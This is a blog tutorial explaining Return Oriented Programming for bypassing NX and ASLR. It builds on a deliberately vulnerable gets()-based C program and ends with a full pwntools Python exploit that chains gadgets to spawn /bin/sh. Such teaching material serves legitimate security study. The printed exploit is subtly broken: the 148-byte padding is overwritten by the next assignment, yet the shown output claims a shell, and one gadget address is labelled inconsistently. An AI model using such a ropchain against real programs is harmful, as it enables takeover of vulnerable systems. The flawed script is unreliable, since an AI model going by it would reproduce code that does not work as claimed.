This article aims to explain clearly what ROP or Return Oriented Programming is. What is this technique? Why is it useful? What are the limits? How to implement it? We will answer these questions together.

<!--more-->

## Reminders

We have seen in previous articles two techniques of exploitation following a buffer overflow. The first one was a [simple introduction and exploitation of buffer overflow (stack-based)](https://beta.hackndo.com/buffer-overflow/) when we had no protection. The stack was executable and the Address Space Layout Randomization (ASLR) was not activated. We will come back to these protections in the following.
We then detailed a technique that could be used when the stack was no longer executable. For that, you can read the article about the [return to libc](https://beta.hackndo.com/retour-a-la-libc/), but this one doesn't work anymore when the ASLR is activated.
This article aims at exposing a new exploitation technique, the ROP (Return Oriented Programming) which allows, in spite of these various protections, to divert the execution flow of a program in order to take control of it.

## Theory
### ASLR

When you run a program, the headers of the binary are supposed to give the location of the different segments/sections. Thus, each time you run the binary, the addresses do not vary. The stack always starts at the same place, the same for the heap, as well as the segments of the binary (But yes! You know, we explained everything in the article about [memory management](https://beta.hackndo.com/memory-allocation/)).
Well, ASLR is a protection in the kernel that will make some address spaces random. Generally, the stack, the heap and the libraries are impacted. It is then no longer possible to find the address of a shellcode placed on the stack, or the address of the `system` function in the libc. This is very annoying.
But don't worry, ROP is here to save us.

### ROP - Return Oriented Programming

If you had been following the article on the [return to libc](https://beta.hackndo.com/retour-a-la-libc/), then you should know that it was a kind of introduction to ROP.
We are still in the same context. A binary is vulnerable to buffer overflow. However, this binary has the two protections we have mentioned

- **NX** : This is the common name for the protection that makes the stack **N**on-e**X**ecutable. No more shellcode on the stack, either in the buffer or in environment variables.
- **ASLR** : In addition to not being executable anymore, the stack moves from one execution to another, just like the heap or the libraries. So this time, we can't find the address of `system` for sure as we did in the article about the [return to libc](https://beta.hackndo.com/retour-a-la-libc/).

To overcome these two protections, we need to find an exploitation technique that does not execute anything on the stack, and that uses information that does not move from one execution to another. For this, we will use code that has already been created. And what could be easier than using the code of the binary we want to exploit?

### The gadgets

It is true that a binary rarely has the code to launch a shell. That would be too nice. However, we can find in one place a piece of code that allows to do an action, then in another place another piece of code that allows to do something else, and so on. In this way, by chaining these little bits of instructions, we can finally succeed in doing actions that were not foreseen by the binary.

An example that is not really realistic but that helps to illustrate my point. Let's consider the present instruction sequence, which is in the binary :
```
[1] PUSH    EBP
[2] MOV     EBP, ESP
[3] SUB     ESP, 0x40
[4] XOR     EAX, EAX
[5] PUSH    EAX
[6] MOV     EAX, 0x41424344
[7] PUSH    EAX
[8] CALL    PRINTF
```

The preceding code is a function prologue, and places the string `ABCD\x00` on the stack before calling the `printf` function. Notice that I have numbered the lines. If we now take the instructions in a new order, for example [4] then [5] followed by [1] and finally [8] then we would have : 
```
[4] XOR     EAX, EAX
[5] PUSH    EAX
[1] PUSH    EBP
[8] CALL    PRINTF
```

In this case, we would have `0x00` on the stack followed by the value of `EBP` and finally a call to `printf`. The result would not be the same at all. As long as we control EBP in some way, we could then display what we want, and why not go on to a format string vulnerability.
But that's not all, we can go even further. Here is the hexadecimal representation of the previous instructions :
```
55                  PUSH    EBP
89 e5               MOV     EBP, ESP
81 ec 40 00 00 00   SUB     ESP, 0x40
33 c0               XOR     EAX, EAX
50                  PUSH    EAX
b8 44 43 42 41      MOV     EAX, 0x41424344
50                  PUSH    EAX
e8 b1 69 00 00      CALL    PRINTF
```

We thought of mixing instructions, but it is also possible to execute pieces of instructions.

Let me explain. An analogy exists with the English language.

In the word "Republic", even if it was not my intention, there are also the words "Pub", "Pu", "Public" etc. It was not the meaning I was looking for, but nothing prevents you from choosing to read only those parts.

Anyway, you understood the principle: We'll pick up pieces of instructions from right and left, not necessarily pieces of instructions planned by the programmer, and by putting them end to end, we'll execute arbitrary code.

These bits of instructions are called **gadgets**.

### Use of the gadgets

All this is nice, but then how to execute these bits of instructions, these gadgets?

In a buffer overflow, when we overwrite enough data, we end up overwriting the EBP backup (pushed on the stack during the prologue of a function) and then the EIP backup of the calling function. We can then redirect the program where we want it, to a gadget of interest.

However, once this piece of code (gadget) is executed, we want to regain control of the execution flow to jump to the second gadget.

This constraint makes that the gadgets have almost always the same shape:
```
<instruction 1>
<instruction 2>
...
<instruction n>
RET
```

Thus, when the instructions we want to perform have been executed, the `RET` instruction allows us to jump to the instruction whose address is on the top of the stack, a stack that we control thanks to the buffer overflow.

Here is a concrete example. Let's imagine that in the set of instructions of my binary, I find in different places the following instructions : 
```
# 0x08041234 Instruction 1
INC   EAX
RET

# 0x08046666 Instruction 2
XOR   EAX, EAX
RET

# 0x08041337 Instruction 3
POP   EBX
RET

# 0x08044242 Instructios 4
INT   0x80
```

You can see that we have the addresses of these 4 gadgets (instruction sequences) `0x08041234`, `0x08046666`, `0x08041337` and `0x08044242`.

To keep the example simple, we will make a `sys_exit` system call with the value `3` as argument (For all system calls you can have a look at my github for [32 bits](https://github.com/Hackndo/misc/blob/master/syscalls32.md) and [64 bits](https://github.com/Hackndo/misc/blob/master/syscalls64.md) architectures).

According to the 32-bit table, to make a system call to `sys_exit`, `EAX` must take the value 1 and EBX the value of the return code, here `3` as we have decided.

In order to obtain these values, having the 4 different sequences of instructions above, we can do this :
```
XOR    EAX, EAX		# So that EAX = 0
INC    EAX		    # Make EAX = 1
POP    EBX		    # Making the value 0x00000003 be on the stack
INT    0x80		    # To make the system call
```

These different instructions put together with the right values on the stack should call the `exit(3)` function.

Let's go back to our buffer overflow. We have rewritten the value of the `EIP` backup of the calling function. So, when our function finishes executing, we will be redirected to the value we put on the `EIP` save.

So we will redirect the execution flow to the first instruction we want to execute, which is the `XOR EAX, EAX`. The stack will then look like this

[![first_gadget](/assets/uploads/2016/10/first_gadget.png)](/assets/uploads/2016/10/first_gadget.png)

The execution flow will be redirected to the instructions : 
```
# 0x08041234 Instruction 1
XOR    EAX, EAX
RET
```

Once the `XOR` is done, the `RET` instruction will be executed. As a reminder, a `RET` is nothing else than a `POP EIP`. The address on the top of the stack will be put in the `EIP` register. As the address on the top of the stack is just after the sEIP that we have overwritten (and that has already been `POP`'d by the `RET` of the function), we just have to put the address of the second gadget on the top of the stack, as follows :

[![second_gadget](/assets/uploads/2016/10/second_gadget.png)](/assets/uploads/2016/10/second_gadget.png)

Followed by the gadget that allows to make the `POP EBX`. However this gadget needs a specific value on the stack, since the gadget will "pop" a value to put it in `EBX`. We will then have the following stack :

[![third_gadget](/assets/uploads/2016/10/third_gadget.png)](/assets/uploads/2016/10/third_gadget.png)

The `POP EBX` will then remove the value `0x00000003` from the stack. All our registers are ready, we just have to redirect the flow to the `int 0x80` instruction which makes the system call : 

[![fourth_gadget](/assets/uploads/2016/10/fourth_gadget.png)](/assets/uploads/2016/10/fourth_gadget.png)

By organizing the stack in this way, we will have our gadgets chained together, filling the registers as we knew them before making the system call that interests us.

Now let's move on to a concrete case.

### Practice
*In this example, I will use the addresses I have on my machine, they will probably not correspond to yours. So adapt your example according to the results of the different commands on your machine!*

Here is the vulnerable program : 
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

# For the compilation, you must add this information to have the right protections
# clang -o rop rop.c -m32 -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static

int main(int argc, char ** argv) {
    char buff[128];

    gets(buff);

    char *password = "I am h4cknd0";

    if (strcmp(buff, password)) {
        printf("You password is incorrect\n");
    } else {
        printf("Access GRANTED !\n");
    }

    return 0;
}
```

I use here the `clang` compiler because `gcc` [produces a prologue and an epilogue](http://reverseengineering.stackexchange.com/questions/13811/what-is-this-protection-that-seems-to-prevent-rop-when-aslr-in-on) which make the exploitation more complicated. As the purpose of this article is to make a simple and classical demonstration of ROP, we use clang which produces a "classical" binary.

You notice the obvious buffer overflow, if we pass this binary a large buffer, it will normally return a segmentation error.
```
$ perl -e 'print "A"x500' | ./rop
You password is incorrect
Segmentation fault (core dumped)
```

As the following command shows, the `GNU_STACK` stack does not have the `X` flag (only `RW`) so it is not executable.
```
$ readelf -l rop

Elf file type is EXEC (Executable file)
Entry point 0x8048736
There are 6 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  LOAD           0x000000 0x08048000 0x08048000 0xa078d 0xa078d R E 0x1000
  LOAD           0x0a0f1c 0x080e9f1c 0x080e9f1c 0x01004 0x023c8 RW  0x1000
  NOTE           0x0000f4 0x080480f4 0x080480f4 0x00044 0x00044 R   0x4
  TLS            0x0a0f1c 0x080e9f1c 0x080e9f1c 0x00010 0x00028 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x0a0f1c 0x080e9f1c 0x080e9f1c 0x000e4 0x000e4 R   0x1
```

Moreover, the ASLR is activated as shown by the flag located here : 
```
$ cat /proc/sys/kernel/randomize_va_space
2
```

If you do not get the same result, with a number other than 2, then perform this command to activate ASLR.

```
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

You can always go back to your original configuration by putting back the number you had initially.

We will try to launch a shell with this program, despite the protections in place. To do this, we will need gadgets. An extremely well known tool for this purpose is called [ROPgadget](http://shell-storm.org/project/ROPgadget/), I'll let you install it. It is very powerful and has a lot of options.

A basic command is :
```
$ ROPgadget --binary rop
```

This command will output all gadgets that end in a `RET` with 10 or less instructions before.

Here is an excerpt : 
```
[...]
0x0804c47e : xor eax, eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08050815 : xor eax, eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805489f : xor eax, eax ; pop ebx ; pop esi ; ret
0x0805821f : xor eax, eax ; pop ebx ; ret
[...]
Unique gadgets found: 11840
```

You can see that we have a lot to do. 11840 results.

If for example we want to find an `XOR EAX, EAX`
```
$ ROPgadget --binary rop | grep "xor eax"
[...]
0x08049323 : xor eax, eax ; ret
```

Great. We have our first gadget that will be useful.

I remind you that we want to run a shell. We need to run `sys_execve("/bin/sh", NULL, NULL)`.

According to the [32-bit](https://github.com/Hackndo/misc/blob/master/syscalls32.md) system call table, the value of `EAX` for an `execve` is 11. Now that we have a gadget that initializes `EAX` to zero, we have to increment it.
```
$ ROPgadget --binary rop | grep "inc eax"
[...]
0x0804812c : inc eax ; ret
[...]
```

Perfect, so far so good.

Then we have to make `EBX` point to the string "/bin/sh", and `ECX` and `EDX` are null pointers, because we don't need them.

To point to the string "/bin/sh", we need to put it in memory. To do this, we must be able to write where we want. This is a rather fancy gadget suite in general, and it has a very specific name **Write-what-where**.

Here is an example with the gadgets proposed by the binary : 
```
0x0806ed1a : pop edx ; ret
0x080b8056 : pop eax ; ret
0x080546db : mov dword ptr [edx], eax ; ret
```

With these three gadgets, we control the contents of the `EDX` and `EAX` registers, and then we can move the contents of `EAX` to the address pointed to by `EDX`. So we write what we want, where we want it. Perfect!

So we are able to write "/bin/sh" somewhere in memory, for example in .data which does not move despite ASLR.
```
$ readelf -S rop | grep " .data "
  [23] .data             PROGBITS        080ea000 0a1000 000f20 00  WA  0   0 32
```

`.data` has the flag `W` for **W**ritable and is located at address `0x080ea000`.

Finally, we need to find gadgets to control our `EBX` and `ECX` registers (because we already found a gadget for `EDX` during the write-what-where). You have understood the technique, here are two of them:
```
0x080de7ad : pop ecx ; ret
0x080481c9 : pop ebx ; ret
```

Of course, to be able to execute all this, you have to make a call to an `int 0x80` instruction : 
```0
x0806c985 : int 0x80
```

Well that's fine, we now have all the gadgets in hand to be able to perform our ROP. To build the chain, we will proceed as follows :
- Place "/bin/sh" at the beginning of `.data`
- Put null bytes just after, so that the string "/bin/sh" ends with a null character.
- Put the address of "/bin/sh" in `EBX`
- Put `0x00` in `ECX` and `EDX`
- Put 11 (0xb) in `EAX` (syscall number)
- Make a call to `int 0x80`

Here is a python code that prepares the overflow by chaining the gadgets.

```
p =  pack('<I', 0x0806ed1a) 		# pop edx ; ret
p += pack('<I', 0x080ea000) 		# In edx, we put the address of the beginning of .data

p += pack('<I', 0x080b8056) 		# pop eax ; ret
p += '/bin'				            # In eax, we put the string "/bin"

p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | This allows to write "/bin" in .data

p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
p += pack('<I', 0x080ea004) 		# In edx, we put the address of .data + 4 to provide "//sh"

p += pack('<I', 0x080b8056) 		# pop eax ; ret
p += '//sh'				            # We put "//sh" in eax

p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | And we write "//sh" just after "/bin".

p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
p += pack('<I', 0x080ea008) 		# In edx, we put the address of .data + 8, so after the string "/bin//sh"

p += pack('<I', 0x08049323) 		# xor eax, eax ; ret

p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | And we make sure that this location contains 0x00 to end the string

p += pack('<I', 0x080481c9) 		# pop ebx ; ret
p += pack('<I', 0x080ea000) 		# In ebx, we put the address of the beginning of .data, which contains "/bin//sh" followed by null bytes

p += pack('<I', 0x080de7ad) 		# pop ecx ; ret
p += pack('<I', 0x00000000) 		# We set ecx to 0

p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
p += pack('<I', 0x00000000) 		# We set edx to 0

p += pack('<I', 0x08049323) 		# xor eax, eax ; ret

for i in range(11):			        # In order to have eax = 11, we loop 11 times
	p += pack('<I', 0x0804812c)	    # inc eax ; ret

p += pack('<I', 0x0806c985) 		# int 0x80
```

Remember, however, that this sequence of gadgets, called **ropchain**, is initiated when the function returns. So the first instruction of this **ropchain** must overwrite the `EIP` save of the calling function.

We've seen in detail in various articles how to find the size of the buffer to allocate before overwriting the `EIP` backup, and in my case it's a 148 byte buffer. So my exploit looks like this in python, using `pwntools` :
```
#coding: utf-8

from pwn import *
from struct import pack

r = process("./rop")

p = "A"*148

p =  pack('<I', 0x0806ed1a) 		# pop edx ; ret
p += pack('<I', 0x080ea000) 		# In edx, we put the address of the beginning of .data

p += pack('<I', 0x080b8056) 		# pop eax ; ret
p += '/bin'				            # In eax, we put the string "/bin"

p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | This allows to write "/bin" in .data

p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
p += pack('<I', 0x080ea004) 		# In edx, we put the address of .data + 4 to provide "//sh"

p += pack('<I', 0x080b8056) 		# pop eax ; ret
p += '//sh'				            # We put "//sh" in eax

p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | And we write "//sh" just after "/bin".

p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
p += pack('<I', 0x080ea008) 		# In edx, we put the address of .data + 8, so after the string "/bin//sh"

p += pack('<I', 0x08049323) 		# xor eax, eax ; ret

p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | And we make sure that this location contains 0x00 to end the string

p += pack('<I', 0x080481c9) 		# pop ebx ; ret
p += pack('<I', 0x080ea000) 		# In ebx, we put the address of the beginning of .data, which contains "/bin//sh" followed by null bytes

p += pack('<I', 0x080de7ad) 		# pop ecx ; ret
p += pack('<I', 0x00000000) 		# We set ecx to 0

p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
p += pack('<I', 0x00000000) 		# We set edx to 0

p += pack('<I', 0x08049323) 		# xor eax, eax ; ret

for i in range(11):			        # In order to have eax = 11, we loop 11 times
	p += pack('<I', 0x0804812c)	    # inc eax ; ret

p += pack('<I', 0x0806c985) 		# int 0x80

r.sendline(p)

r.interactive()
```

So, when we launch our exploit, we get a shell :
```
$ python exploit.py 
[+] Starting local process './rop': Done
[*] Switching to interactive mode
You password is incorrect
$ 
```

ROP, this is super cool, have fun with it. In my example, I unfortunately didn't have a gadget of the form :
```
int 0x80
ret
```

So I couldn't chain the system calls. But if you have that in another binary, then you can chain almost as many system calls as you want, and you can build a complex execution chain, just by using bits of code left and right.

Moreover, if you are interested in going a little further, I highly recommend you to read Geluchat's excellent article "[A Beginner's Manual for ROP - In French](https://www.dailysecurity.fr/return_oriented_programming/)".

Have fun !
